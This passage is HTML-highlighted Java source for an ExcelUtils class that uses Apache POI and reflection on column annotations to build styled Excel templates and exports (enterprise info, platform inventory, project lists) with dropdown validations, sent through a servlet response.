punctuation">.</span>OutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Comparator<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Date<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span>AtomicInteger<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>Collectors<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @Classname ExcelUtils * @Date 2022/5/11 0011 * @Created by jm */</span><span class="token annotation punctuation">@Slf4j</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExcelUtils</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token keyword">void</span> <span class="token function">writeEntpriseExportTemplateExcel</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> depts<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Class<span class="token operator">&lt;</span>EnterpriseExcel<span class="token operator">></span> cls <span class="token operator">=</span> EnterpriseExcel<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>Field<span class="token operator">></span> fieldList <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>fields<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> annotation<span class="token punctuation">.</span><span class="token function">col</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span>Comparator<span class="token punctuation">.</span><span class="token function">comparing</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    <span class="token keyword">int</span> col <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        col <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">col</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> col<span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String firstSheetName <span class="token operator">=</span> <span class="token string">"企业信息"</span><span class="token punctuation">;</span>        HSSFWorkbook wb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HSSFSheet sheet <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        sheet<span class="token punctuation">.</span><span class="token function">setDefaultColumnWidth</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        AtomicInteger ai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">{</span>            Row row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            row<span class="token punctuation">.</span><span class="token function">setHeight</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">30</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            AtomicInteger aj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//写入头部</span>            fieldList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String columnName <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    columnName <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                Cell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>aj<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                CellStyle cellStyle <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>ROYAL_BLUE<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setFillPattern</span><span class="token punctuation">(</span>FillPatternType<span class="token punctuation">.</span>SOLID_FOREGROUND<span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//垂直剧中</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>LEFT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//水平居左</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderBottom</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//下边框</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderLeft</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//左边框</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderTop</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//上边框</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderRight</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//右边框</span>                Font font <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                font<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>BLACK<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                font<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>columnName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//冻结窗格</span>        wb<span class="token punctuation">.</span><span class="token function">getSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createFreezePane</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//下拉选项</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> textlist_properties <span class="token operator">=</span> depts<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span>depts<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setHSSFValidation</span><span class="token punctuation">(</span>wb<span class="token punctuation">.</span><span class="token function">getSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">,</span> textlist_properties<span class="token punctuation">,</span> <span class="token string">"所属镇办名称"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//学校类型下拉选项</span><span class="token comment" spellcheck="true">//        String[] textlist_schoolType = {"文教、工美、体育和娱乐用品制造业", "计算机、通信和其他电子设备制造业"};</span><span class="token comment" spellcheck="true">//        setHSSFValidation(wb.getSheet(firstSheetName), textlist_schoolType, "所属行业", 1, 99999, 6, 6, 2);</span>        <span class="token function">buildExcelDocument</span><span class="token punctuation">(</span>wb<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token keyword">void</span> <span class="token function">writePlatformInventoryExcel</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>PlatformInventoryExcel<span class="token operator">></span> dataList<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> dictList<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Class<span class="token operator">&lt;</span>PlatformInventoryExcel<span class="token operator">></span> cls <span class="token operator">=</span> PlatformInventoryExcel<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>Field<span class="token operator">></span> fieldList <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>fields<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> annotation<span class="token punctuation">.</span><span class="token function">col</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span>Comparator<span class="token punctuation">.</span><span class="token function">comparing</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    <span class="token keyword">int</span> col <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        col <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">col</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> col<span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String firstSheetName <span class="token operator">=</span> <span class="token string">"平台清单"</span><span class="token punctuation">;</span>        HSSFWorkbook wb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HSSFSheet sheet <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        sheet<span class="token punctuation">.</span><span class="token function">setDefaultColumnWidth</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        AtomicInteger ai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">{</span>            Row row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            row<span class="token punctuation">.</span><span class="token function">setHeight</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">30</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            AtomicInteger aj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//写入头部</span>            fieldList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String columnName <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    columnName <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                Cell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>aj<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                CellStyle cellStyle <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderRight</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setRightBorderColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>GREY_50_PERCENT<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderLeft</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setLeftBorderColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>GREY_50_PERCENT<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderTop</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setTopBorderColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>GREY_50_PERCENT<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderBottom</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBottomBorderColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>GREY_50_PERCENT<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Font font <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                font<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>BLACK<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                font<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>columnName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>CollectionUtils<span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>dataList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            dataList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>t <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                Row row1 <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                AtomicInteger aj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                fieldList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> type <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    String dateFormat <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                    Object value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        value <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    Cell cell <span class="token operator">=</span> row1<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>aj<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> Date<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            dateFormat <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">dateFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            String formatValue <span class="token operator">=</span> DateUtil<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Date<span class="token punctuation">)</span> value<span class="token punctuation">,</span> dateFormat<span class="token punctuation">)</span><span class="token punctuation">;</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>formatValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//冻结窗格</span>        wb<span class="token punctuation">.</span><span class="token function">getSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createFreezePane</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//下拉选项</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> textlist_properties <span class="token operator">=</span> dictList<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span>dictList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setHSSFValidation</span><span class="token punctuation">(</span>wb<span class="token punctuation">.</span><span class="token function">getSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">,</span> textlist_properties<span class="token punctuation">,</span> <span class="token string">"清单类别"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">buildExcelDocument</span><span class="token punctuation">(</span>wb<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token keyword">void</span> <span class="token function">writeProjectListExcel</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>ProjectListExcel<span class="token operator">></span> dataList<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> industryList<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>String<span class="token 